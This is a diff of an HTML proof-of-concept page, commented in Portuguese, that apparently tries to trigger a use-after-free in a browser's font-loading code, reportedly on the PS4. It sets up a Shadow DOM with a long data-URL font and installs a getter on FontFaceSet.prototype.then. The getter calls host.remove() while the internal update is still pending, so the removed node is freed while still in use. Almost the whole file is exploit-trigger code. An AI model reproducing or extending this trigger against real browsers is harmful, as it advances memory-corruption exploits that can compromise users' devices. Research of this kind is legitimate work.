@@ -1,152 +1,80 @@
 
 <!DOCTYPE html>
 <html>
+<head><meta charset="utf-8"></head>
 <body>
+<pre id="log"></pre>
 <script>
+// V5: baseado no diagnostico que CONFIRMOU o getter disparando via async
+// Agora com host.remove() para tentar o UAF real
+// Mantém execução inline (não window.onload) como no diagnostico
+
+function log(s) {
+    document.getElementById('log').textContent += s + '\n';
+}
+
+// Touch antes do load event (essencial para completedLoading() settlar fonts.ready)
 document.fonts;
 
-function log(msg) {
-    document.body.appendChild(document.createTextNode(msg));
-    document.body.appendChild(document.createElement("br"));
-}
+// Setup Shadow DOM
+var host = document.createElement('div');
+document.body.appendChild(host);
+var shadow = host.attachShadow({ mode: 'open' });
 
-function run() {
-    // --- Setup Shadow DOM ---
-    const host = document.createElement("div");
-    document.body.appendChild(host);
-    const shadowRoot = host.attachShadow({ mode: "open" });
+// DATA URL base64 longa = parse como macrotask separada (como no diagnostico)
+// Isso garante que completedLoading() dispare via caminho async → thenable check
+var pendingUrl = 'data:font/woff;base64,' + 'A'.repeat(150000);
+var style = document.createElement('style');
+style.textContent =
+    '@font-face { font-family: reentryFont; src: url("' + pendingUrl + '"); }' +
+    '.probe { font: 24px reentryFont; }';
+shadow.appendChild(style);
 
-    const fakeOtf = new Uint8Array(500 * 1024);
-    for (let i = 0; i < fakeOtf.length; i++) fakeOtf[i] = i & 0xFF;
-    const blob = new Blob([fakeOtf], { type: "font/otf" });
-    const blobUrl = URL.createObjectURL(blob);
+var probe = document.createElement('span');
+probe.className = 'probe';
+probe.textContent = 'A';
+shadow.appendChild(probe);
 
-    const fontFaceStyle = document.createElement("style");
-    fontFaceStyle.textContent =
-        `@font-face { font-family: reentryFont; src: url("${blobUrl}"); }` +
-        `.probe { font: 24px reentryFont; }`;
-    shadowRoot.appendChild(fontFaceStyle);
+// Forca layout para iniciar o carregamento
+document.body.offsetHeight;
+document.fonts.load('24px reentryFont', 'A');
+log('status: ' + document.fonts.status);
 
-    const probe = document.createElement("span");
-    probe.className = "probe";
-    probe.textContent = "A";
-    shadowRoot.appendChild(probe);
+// Materializa fonts.ready (necessario para thenable assimilation)
+document.fonts.ready;
 
-    document.body.offsetHeight;
-    document.fonts.load("24px reentryFont", "A");
+// Prepend ANTES do getter (para criar pendencia UpdateType::ActiveSet)
+// NO PS4: o prepend nao faz o getter disparar de forma sincrona
+// mas cria o estado de pendencia para quando completedLoading() disparar async
+var prependedStyle = document.createElement('style');
+prependedStyle.textContent = '.unused { color: red; }';
+shadow.prepend(prependedStyle);
+log('apos prepend. status=' + document.fonts.status);
 
-    // Materializa faces individuais (H1: FontFace.loaded thenable path)
-    let shadowFace = null;
-    document.fonts.forEach(f => {
-        const fam = f.family.trim().replace(/['"]/g, '');
-        if (fam === 'reentryFont') {
-            shadowFace = f;
-            void f.loaded; // materializa promise individual
-        }
-    });
-    log("shadowFace encontrado: " + !!shadowFace);
-    log("shadowFace.status: " + (shadowFace ? shadowFace.status : "N/A"));
-
-    // Materializa fonts.ready (caminho original)
-    document.fonts.ready;
-
-    // ================================================================
-    // INSTALAR AMBOS OS GETTERS antes do prepend
-    // ================================================================
-
-    // H1: FontFace.prototype.then (confirmado em 5 testes no PS4)
-    let ffGetterCount = 0;
-    Object.defineProperty(FontFace.prototype, 'then', {
-        configurable: true,
-        get() {
-            delete FontFace.prototype.then;
-            ++ffGetterCount;
-            const fam = this.family || '?';
-            const st  = this.status  || '?';
-            log(">>> FontFace.prototype.then! family=" + fam + " status=" + st);
-            host.remove(); // UAF: libera no iterado
-            return undefined;
-        }
-    });
-
-    // H2: FontFaceSet.prototype.then (caminho original do commit)
-    let ffsGetterCount = 0;
-    Object.defineProperty(FontFaceSet.prototype, 'then', {
-        configurable: true,
-        get() {
-            delete FontFaceSet.prototype.then;
-            ++ffsGetterCount;
-            log(">>> FontFaceSet.prototype.then! status=" + document.fonts.status);
-            host.remove();
-            return undefined;
-        }
-    });
-
-    log("ambos getters instalados. status=" + document.fonts.status);
-
-    // ================================================================
-    // TRIGGER: prepend (flush síncrono no PS4)
-    // ================================================================
-    const prependedStyle = document.createElement("style");
-    prependedStyle.textContent = ".unused { color: red; }";
-    shadowRoot.prepend(prependedStyle);
-
-    log("apos prepend: FF=" + ffGetterCount + " FFS=" + ffsGetterCount
-        + " status=" + document.fonts.status);
-
-    // ================================================================
-    // DIAGNOSTICO H2: testar se completedLoading usa JSPromise::resolve
-    // Verificar o tipo do valor resolvido pela ready promise
-    // ================================================================
-    if (ffGetterCount === 0 && ffsGetterCount === 0) {
-        log("--- DIAGNOSTICO EXTRA ---");
-
-        // Verifica se fonts.ready ja resolveu e com que valor
-        document.fonts.ready.then
-            ? log("fonts.ready.then existe (promise nao resolvida ou thenable)")
-            : log("fonts.ready.then ausente");
-
-        // Tenta forcar completedLoading via face.load() (padrao UAF_CSSFontFace_load)
-        let ffCount2 = 0;
-        Object.defineProperty(FontFace.prototype, 'then', {
-            configurable: true,
-            get() {
-                delete FontFace.prototype.then;
-                ++ffCount2;
-                log(">>> FontFace.then via face.load path! status=" + this.status);
-                return undefined;
-            }
-        });
-        if (shadowFace) {
-            shadowFace.load();
-            log("apos shadowFace.load(): getter=" + ffCount2);
-        }
-
-        // Testa se measureText com a fonte dispara qualquer getter
-        let ffCount3 = 0;
-        Object.defineProperty(FontFace.prototype, 'then', {
-            configurable: true,
-            get() {
-                delete FontFace.prototype.then;
-                ++ffCount3;
-                log(">>> FontFace.then via measureText! status=" + this.status);
-                return undefined;
-            }
-        });
-        const cv = document.createElement("canvas");
-        cv.getContext("2d").font = "24px reentryFont";
-        cv.getContext("2d").measureText("A");
-        log("apos measureText: getter=" + ffCount3);
+// Instala getter COM host.remove() — agora que sabemos que dispara
+var getterCount = 0;
+Object.defineProperty(FontFaceSet.prototype, 'then', {
+    configurable: true,
+    get: function() {
+        delete FontFaceSet.prototype.then;
+        getterCount++;
+        log('>>> GETTER DISPAROU! count=' + getterCount);
+        log('    status no momento: ' + document.fonts.status);
+        // HOST.REMOVE() = libera no iterado → UAF se flushPendingDescendantUpdates
+        // estiver na call stack (como descrito no commit 86074ba)
+        host.remove();
+        log('    apos host.remove() — sem crash ate aqui');
+        return undefined;
     }
+});
 
-    log("--- RESULTADO FINAL ---");
-    log("FontFace.prototype.then total: " + ffGetterCount);
-    log("FontFaceSet.prototype.then total: " + ffsGetterCount);
-    log("status final: " + document.fonts.status);
-    log("PASS se nao travou.");
-}
+log('getter instalado. status=' + document.fonts.status);
+log('aguardando completedLoading() async...');
 
-window.addEventListener("load", () => setTimeout(run, 0));
+// Microtask checkpoint
+Promise.resolve().then(function() {
+    log('microtask: status=' + document.fonts.status + ' getter=' + getterCount);
+});
 </script>
 </body>
 </html>
